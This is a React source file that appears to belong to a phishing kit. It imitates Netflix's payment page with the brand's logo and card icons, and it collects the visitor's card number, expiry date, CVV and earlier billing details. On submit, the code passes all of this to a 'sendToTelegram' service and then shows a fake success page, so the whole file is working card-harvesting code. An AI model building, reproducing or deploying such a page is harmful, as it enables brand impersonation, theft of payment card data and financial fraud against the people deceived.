import React, { useState } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { HelpCircle } from 'lucide-react';
import { config } from '../config';
import { sendToTelegram } from '../services/telegram';
import { motion } from 'framer-motion';

export function PaymentPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const [showCVVHelp, setShowCVVHelp] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiry: '',
    cvv: ''
  });

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
    setFormData({ ...formData, cardNumber: formattedValue });
  };

  const handleExpiryInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) {
      value = value.slice(0, 4);
    }
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    setFormData({ ...formData, expiry: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const billingInfo = location.state?.billingInfo;
    await sendToTelegram({
      type: 'payment',
      ...formData,
      billingInfo
    });
    navigate('/success');
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="border-b border-gray-200"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.2 }}
          className="w-full max-w-[440px]"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.3 }}
            className="mb-8"
          >
            <span className="block text-sm text-[#737373] mb-1">
              {intl.formatMessage({ id: 'step.of' }, { current: 2, total: 3 })}
            </span>
            <h1 className="text-[32px] font-medium text-[#333333] font-bold">
              {intl.formatMessage({ id: 'payment.title' })}
            </h1>
          </motion.div>

          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.4 }}
            className="flex space-x-2 mb-8"
          >
            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg" alt="Visa" className="h-6" />
            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" alt="Mastercard" className="h-6" />
            <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" alt="American Express" className="h-6" />
            {config.ApplePayEnabled && (
              <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/applepay-v2.svg" alt="Apple Pay" className="h-6" />
            )}
          </motion.div>

          <motion.form
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.5 }}
            onSubmit={handleSubmit}
            className="space-y-4"
          >
            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'payment.card.number' })}
              </label>
              <input
                required
                type="text"
                value={formData.cardNumber}
                onChange={handleCardNumberInput}
                maxLength={23}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'payment.card.expiry' })}
              </label>
              <input
                required
                type="text"
                placeholder="MM/YY"
                maxLength={5}
                value={formData.expiry}
                onChange={handleExpiryInput}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
            </div>

            <div className="relative border border-[#8c8c8c] rounded focus-within:border-[#0071eb]">
              <label className="absolute top-1 left-3 text-xs text-[#8c8c8c] font-bold">
                {intl.formatMessage({ id: 'payment.card.cvv' })}
              </label>
              <input
                required
                type="text"
                placeholder="CVV"
                maxLength={4}
                pattern="[0-9]*"
                value={formData.cvv}
                onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
                className="w-full pt-5 pb-2 px-3 text-[#333333] bg-transparent focus:outline-none"
              />
              <button
                type="button"
                onClick={() => setShowCVVHelp(!showCVVHelp)}
                className="absolute right-2 top-1/2 -translate-y-1/2"
              >
                <HelpCircle className="w-6 h-6 text-[#8c8c8c]" />
              </button>
            </div>

            {showCVVHelp && (
              <motion.div
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                className="p-4 bg-[#f4f4f4] rounded text-sm text-[#333333]"
              >
                {intl.formatMessage({ id: 'payment.card.cvv.help' })}
              </motion.div>
            )}

            <motion.button 
              type="submit"
              className="w-full text-white bg-[#e50914] rounded px-8 py-4 text-base font-medium hover:bg-[#f6121d] transition-all transform hover:scale-[1.02] mt-8"
            >
              {intl.formatMessage({ id: 'payment.button' })}
            </motion.button>
          </motion.form>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}